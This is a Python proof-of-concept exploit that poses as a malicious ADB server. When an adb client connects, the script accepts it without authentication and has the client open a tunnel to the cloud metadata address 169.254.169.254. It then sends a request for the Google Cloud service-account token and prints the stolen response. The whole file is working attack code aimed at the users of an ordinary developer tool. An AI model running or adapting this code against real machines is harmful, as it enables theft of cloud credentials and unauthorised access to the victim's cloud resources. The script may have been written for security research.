#!/usr/bin/env python3


import socket
import adb_shell
from adb_shell import adb_message
from builtins import bytes

HOST = '0.0.0.0'  # Standard loopback interface address (localhost)
PORT = 5556        # Port to listen on (non-privileged ports are > 1023)

LOCAL_ID = 1234
TARGET = b'169.254.169.254:80' # b"127.0.0.1:1111"
HTTP_REQUEST = b"GET /computeMetadata/v1/instance/service-accounts/default/token HTTP/1.0\r\nHost: "+TARGET+b"\r\nMetadata-Flavor: Google\r\n\r\n"

def pack(cmd, arg0, arg1, payload):
    header = adb_message.AdbMessage(cmd, arg0, arg1, payload).pack()
    return header+payload

A_CNXN = pack(
    adb_shell.constants.CNXN,
    16777216, # version
    262144, # max_data
    b'host::features=stat_v2,cmd,shell_v2'
)

A_OPEN_METADATA = pack(
    adb_shell.constants.OPEN,
    LOCAL_ID, # local-id
    0, # constant, unused
    b'tcp:'+TARGET+b'\x00' # destination; 
                           # TODO: test local:... target - no idea if that would work
                           # TODO: verify what happens if we "forget" sending the trailing \x00
)


def unpack(data):
    print(data)
    header = data[0:24]
    payload = data[24:]
    unpacked = adb_message.unpack(header)
    # cmd, arg0, arg1, data_length, checksum
    payload = payload[0:unpacked[3]]
    cmd_str = adb_message.int_to_cmd(unpacked[0]).decode("utf-8")
    return (cmd_str, unpacked, payload)

def do_read(conn):
    data = conn.recv(1024)
    if not data:
        return
    print("<<<", data)
    parsed = unpack(data)
    print(parsed)
    return parsed
    
def do_send(conn, data):
    print(">>>", data)
    conn.sendall(data)

def do_the_job():
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        s.bind((HOST, PORT))
        s.listen()
        print("Listening on", HOST, PORT)
        while True:
            conn, addr = s.accept()
            with conn:
                print('Connected by', addr)
                request_sent = False
                while True:
                    data = do_read(conn)
                    if not data:
                        break
                    if data[0] == "CNXN":
                        print("Accepting the incoming connection without authentication")
                        do_send(conn, A_CNXN)
                        print("And also asking the remote adb client to kindly connect to our target")
                        do_send(conn, A_OPEN_METADATA)
                    if data[0] == "OKAY" and not request_sent:
                        print("The connection has established!")
                        remote_id = data[1][1]
                        do_send(conn, pack(adb_shell.constants.WRTE, LOCAL_ID, remote_id, HTTP_REQUEST))
                        request_sent = True
                    if data[0] == "WRTE":
                        print("Wooho, we got response for our rouge request!")
                        print(data[2])
            print("Connection closed")

if __name__ == "__main__":
    do_the_job()
